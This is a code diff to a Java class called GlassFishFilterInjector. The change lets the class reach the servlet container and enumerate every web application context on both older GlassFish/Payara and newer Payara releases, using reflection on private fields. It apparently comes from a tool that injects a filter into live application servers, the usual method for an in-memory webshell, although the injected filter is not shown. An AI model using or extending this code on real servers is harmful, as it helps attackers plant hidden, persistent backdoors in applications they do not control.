@@ -91,10 +91,19 @@ public class GlassFishFilterInjector {
                 if (target == null) {
                     continue;
                 }
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(target, "this$0"), "children");
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
+                if (childrenMap == null) {
+                    continue;
+                }
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
+                    if (children != null) {
+                        contexts.addAll(children.values());
+                    }
                 }
             }
         }
@@ -111,6 +120,23 @@ public class GlassFishFilterInjector {
             }
         }
         return target;
+    }
+
+    /**
+     * Older GlassFish/Payara: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        Object container = getFieldValue(target, "this$0");
+        if (container != null) {
+            return container;
+        }
+        Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+        Object base = atomic != null ? getFieldValue(atomic, "base") : getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
